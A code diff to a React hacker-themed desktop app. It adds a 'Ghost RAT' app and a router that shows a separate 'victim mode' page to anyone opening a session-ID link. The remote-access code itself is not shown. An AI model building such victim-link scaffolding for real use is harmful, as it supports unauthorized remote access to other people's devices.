@@ -9,10 +9,11 @@ import { AssistantApp } from './components/apps/Assistant';
 import { BrowserApp } from './components/apps/Browser';
 import { RadioApp } from './components/apps/Radio';
 import { MonitorApp } from './components/apps/Monitor';
+import { GhostApp, GhostVictimApp } from './components/apps/Ghost';
 import { MatrixBackground } from './components/os/MatrixBackground';
 import { AppDefinition, SystemSettings } from './types';
 import { APP_IDS, DEFAULT_WALLPAPER } from './constants';
-import { Terminal, Settings, Cloud, Search, LayoutGrid, FileText, Music, Box, Instagram, Facebook, Mail, Youtube, Radio, Activity, Globe } from 'lucide-react';
+import { Terminal, Settings, Cloud, Search, LayoutGrid, FileText, Music, Box, Instagram, Facebook, Mail, Youtube, Radio, Activity, Globe, Ghost } from 'lucide-react';
 
 const PlaceholderApp: React.FC<{title: string}> = ({ title }) => (
     <div className="flex items-center justify-center h-full text-slate-500 flex-col gap-4 bg-slate-900">
@@ -21,8 +22,6 @@ const PlaceholderApp: React.FC<{title: string}> = ({ title }) => (
     </div>
 );
 
-// We define this without the explicit type annotation (Record<string, AppDefinition>) 
-// to prevent TypeScript from strictly checking the component props inside the object literal.
 const DEFAULT_REGISTRY = {
   [APP_IDS.TERMINAL]: { id: APP_IDS.TERMINAL, name: 'Terminal', icon: Terminal, color: 'emerald', component: TerminalApp, isSystem: true },
   [APP_IDS.SETTINGS]: { id: APP_IDS.SETTINGS, name: 'Settings', icon: Settings, color: 'slate', component: SettingsApp as any, isSystem: true },
@@ -31,6 +30,7 @@ const DEFAULT_REGISTRY = {
   [APP_IDS.BROWSER]: { id: APP_IDS.BROWSER, name: 'Shadow Surf', icon: Globe, color: 'blue', component: BrowserApp, isSystem: true },
   [APP_IDS.RADIO]: { id: APP_IDS.RADIO, name: 'World Radio', icon: Radio, color: 'violet', component: RadioApp, isSystem: true },
   [APP_IDS.MONITOR]: { id: APP_IDS.MONITOR, name: 'Net Monitor', icon: Activity, color: 'red', component: MonitorApp, isSystem: true },
+  [APP_IDS.GHOST]: { id: APP_IDS.GHOST, name: 'Ghost RAT', icon: Ghost, color: 'red', component: GhostApp, isSystem: true },
   [APP_IDS.FILES]: { id: APP_IDS.FILES, name: 'Files', icon: FileText, color: 'yellow', component: () => <PlaceholderApp title="File Manager" />, isSystem: true },
   [APP_IDS.MEDIA]: { id: APP_IDS.MEDIA, name: 'Media Player', icon: Music, color: 'pink', component: () => <PlaceholderApp title="Media Player" />, isSystem: true },
   [APP_IDS.INSTAGRAM]: { id: APP_IDS.INSTAGRAM, name: 'Instagram', icon: Instagram, color: 'pink', component: BrowserApp, defaultUrl: 'https://instagram.com' },
@@ -41,13 +41,34 @@ const DEFAULT_REGISTRY = {
 };
 
 export default function App() {
+  const [ghostSession, setGhostSession] = useState<string | null>(null);
+
+  // --- ROUTER CHECK ---
+  useEffect(() => {
+    // 1. Check Pathname (Preferred: domain.com/SESSION_ID)
+    const path = window.location.pathname.substring(1); // Remove leading slash
+    
+    // Ignore paths that look like files or system folders
+    if (path && !path.startsWith('assets') && !path.includes('.') && path.length > 4) {
+        setGhostSession(path);
+        return;
+    }
+
+    // 2. Fallback: Query Params (domain.com/?ghost_session=ID)
+    const params = new URLSearchParams(window.location.search);
+    const session = params.get('ghost_session');
+    if (session) {
+      setGhostSession(session);
+    }
+  }, []);
+
   // --- NORMAL OS RENDER ---
-  // Cast DEFAULT_REGISTRY to 'any' before casting to the Record type to bypass strict checks
   const [appRegistry, setAppRegistry] = useState<Record<string, AppDefinition>>(DEFAULT_REGISTRY as any);
 
   const [installedApps, setInstalledApps] = useState<string[]>([
     APP_IDS.TERMINAL, 
     APP_IDS.MONITOR,
+    APP_IDS.GHOST,
     APP_IDS.STORE, 
     APP_IDS.SETTINGS,
     APP_IDS.BROWSER, 
@@ -118,6 +139,11 @@ export default function App() {
         document.documentElement.style.removeProperty('--font-primary');
     }
   }, [settings.darkMode, settings.glassIntensity, isHackerMode]);
+
+  // --- VICTIM MODE RENDER ---
+  if (ghostSession) {
+      return <GhostVictimApp sessionId={ghostSession} />;
+  }
 
   const openApp = (id: string) => {
     if (!runningApps.includes(id)) setRunningApps([...runningApps, id]);
